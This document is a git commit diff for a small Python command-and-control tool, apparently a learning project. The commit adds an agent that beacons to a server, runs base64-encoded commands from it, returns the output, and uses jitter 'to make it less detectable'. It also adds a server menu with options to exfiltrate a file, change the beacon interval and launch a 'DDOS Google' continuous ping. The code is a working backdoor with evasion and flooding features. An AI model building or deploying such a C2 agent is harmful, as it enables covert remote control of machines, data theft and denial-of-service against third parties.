94f2b3d8e47ee770e50cf8faf8fce15704c1eca8
dax <daxtonwirth@gmail.com>
2022-09-28 14:14:54 -0600

    added interval change and ddos

--- agent.py
+++ agent.py
@@ -10,10 +10,11 @@ HOST, PORT = "localhost", 9999
 command = "hostname"
 data = os.popen(command).read()
 Loop = True
+min, max = 1, 5
 
 while(Loop):
 
-    # Create a socket (SOCK_STREAM means a TCP socket)
+    # Create a TCP socket 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         # Connect to server and send data
         sock.connect((HOST, PORT))
@@ -21,16 +22,26 @@ while(Loop):
 
         # Receive data from the server
         received = str(sock.recv(2048), "utf-8")
+        
+        # Decode data
+        received = base64.b64decode(received).decode("utf-8")
 
-        received = base64.b64decode(received).decode("ascii")
-
-        if received == "1":
+        # Exit the loop if exit is received from the server
+        if received == "exit":
+            Loop = False
+        elif received == "INTERVAL":
+            min = int(str(sock.recv(1024), "utf-8"))
+            max = int(str(sock.recv(1024), "utf-8"))
+            time.sleep(random.randint(min,max))
+        elif received == "PING":
+            command = "ping -t 8.8.8.8"
+            os.system(command)
             Loop = False
         else:
-
+            # run the command and save the output
             c2command = os.popen(received).read()
             sock.sendall(bytes(c2command + "\n", "utf-8"))
 
             # Add jitter to make it less detectable
-            time.sleep(random.randint(1,5))
+            time.sleep(random.randint(min,max))
 
--- server.py
+++ server.py
@@ -1,5 +1,6 @@
 import socketserver  
 import base64
+import time
 
 class MyTCPHandler(socketserver.BaseRequestHandler):
     """ 
@@ -9,28 +10,58 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
         self.data = self.request.recv(2048).strip().decode('utf-8')
         print("\nReceived connection from {}:{}".format(self.client_address[0], self.data))
 
-        option = input("1. Run a command\n2. Exfil test file\n3. Stop beaconing\nOption: ") 
+        option = input("1. Run a command\n2. Exfil test file\n3. Change beaconing interval\n4. DDOS Google (Continuous ping 8.8.8.8)\n5. Stop beaconing\nOption: ") 
 
+        # Run a command
         if option == "1":
             command = input("Enter command: ")
 
-            encodedcommand = base64.b64encode(command.encode("ascii")).decode("ascii")
+            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
 
             self.request.sendall(bytes(encodedcommand, "utf-8"))
             self.data = self.request.recv(2048).strip().decode('utf-8')
             print(self.data)
+            
+        # Exfil text file
         elif option == "2":
-            command = "cat test.txt"
-            self.request.sendall(bytes(command, "utf-8"))
+            command = "type test.txt"
+            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+            self.request.sendall(bytes(encodedcommand, "utf-8"))
+            
             self.data = self.request.recv(2048).strip().decode('utf-8')
 
-            f = open("testexfil.txt", "x")
-            f.write(self.data)
+            f = open("testexfil.txt", "a")
+            f.write("\n" + self.data)
             f.close()
             print("testexfil.txt exfiltrated")
 
+        # change beaconing interval
+        elif option == "3":
+
+            min = input("Minimum beaconing interval (seconds): ")
+            max = input("Maximum beaconing interval (seconds): ")
+            
+            if max >= min:
+                # Tell the client we are changing the interval
+                interval = "INTERVAL"
+                interval = base64.b64encode(interval.encode("utf-8")).decode("utf-8")
+                self.request.sendall(bytes(interval, "utf-8"))
+                time.sleep(1)
+                self.request.sendall(bytes(min, "utf-8"))
+                self.request.sendall(bytes(max, "utf-8"))
+            else:
+                print("Please enter a valid min and max")
+        
+        elif option == "4":
+            command = "PING"
+            interval = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+            self.request.sendall(bytes(interval, "utf-8"))
+            print("Pinging 8.8.8.8")
+            
         else:
-            self.request.sendall(bytes("1", "utf-8"))
+            command = "exit"
+            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+            self.request.sendall(bytes(encodedcommand, "utf-8"))
 
     def menu():
         print("Type exit to stop beacon")
